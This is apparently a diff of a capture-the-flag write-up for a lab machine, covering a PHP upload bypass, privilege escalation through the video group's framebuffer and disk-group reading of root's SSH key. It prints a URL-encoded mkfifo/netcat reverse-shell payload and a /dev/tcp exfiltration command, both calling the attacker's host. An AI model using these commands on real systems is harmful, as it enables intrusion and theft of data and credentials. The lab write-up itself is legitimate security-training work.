@@ -69,7 +69,7 @@ Interestingly enough the output mentioned the file name being too long and short
 </br>
 </br>
 
-**PHP REVERSE SHELL**
+**PHP Reverse Shell**
 
 So now my idea was to make it so that the .png part gets cut off by the upload system and we're left off with <file>.php from which we can execute PHP code.
 I used `vi` to insert this arbitrary PHP execution code in the file we're going to upload next:
@@ -79,9 +79,10 @@ and set up `nc -lvnp 443` on our other terminal.
  
 So now we send a request with `leo=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.3+443+>/tmp/f` to `http://10.10.10.73/uploads/<folder from CMD output>/<file name>.php` as the payload.
 * Important to URL encode it - otherwise the payload won't work.
-
- And finally I got the shell.
+ 
  ![image](https://user-images.githubusercontent.com/88967140/178956561-cdabbc78-1a05-4a42-8880-6d899fa95fa5.png)
+ 
+  And finally I got the shell.
  </br>
  </br>
  
@@ -93,5 +94,45 @@ So now we send a request with `leo=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/s
  
  Reusing those credentials, I was able to SSH in as `moshe` and read user.txt.
  ![image](https://user-images.githubusercontent.com/88967140/178957521-383fa639-74d0-4138-9f0c-169c2dfe3b37.png)
+ </br>
+ </br>
+ 
+ **moshe -> yossi**
+ 
+ `moshe` was part of many groups and video looked interesting.
+ ![image](https://user-images.githubusercontent.com/88967140/178964905-4dc73b87-8b19-460c-aae5-143f9c8739b3.png)
+ 
+It should be noted that users in the `video` group can access video capture devices and there's one framebuffer for each monitor which can be accessed through `/dev/fb[x]`.
 
+I used `cat /dev/fb0 > fb0.data`, `cat fb0.data > /dev/tcp/10.10.16.3/8000` and moved this file over to my Kali.
+
+Afterwards I used gimp to open this file as `Raw image data`, set the width and height according to `/sys/class/graphics/fb0/virtual_size` and got this picture.
+![image](https://user-images.githubusercontent.com/88967140/178964970-2beaa2c6-99d2-4056-a9a2-82aa84bfbcbe.png)
+</br>
+</br>
+
+**yossi -> root**
+So now that I got the password, I used it to SSH in as `yossi`.
+![image](https://user-images.githubusercontent.com/88967140/178967068-03ce0714-b4c6-49cc-adfe-123314ae11e4.png)
+
+We can see that the user is part of `disk` group. This should be kept in mind because members of the disk group can read and alter any files on any hard drives, which is mostly equivalent to having root access.
+
+https://wiki.debian.org/SystemGroups tells us that `The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.`
+</br>
+</br>
+
+**Getting root Shell**
+With this information at my disposal, I decided to `cat` RSA private key for `root` since I'd be able to SSH in as root using that exact key.
+![image](https://user-images.githubusercontent.com/88967140/178967911-6144c2d0-46fc-43da-b919-657f69bb192a.png)
+
+![image](https://user-images.githubusercontent.com/88967140/178968091-07014aa9-39b2-4841-8cb6-ad58c8bc3736.png)
+
+
+
+`
+
+
+
+ 
+ 
  
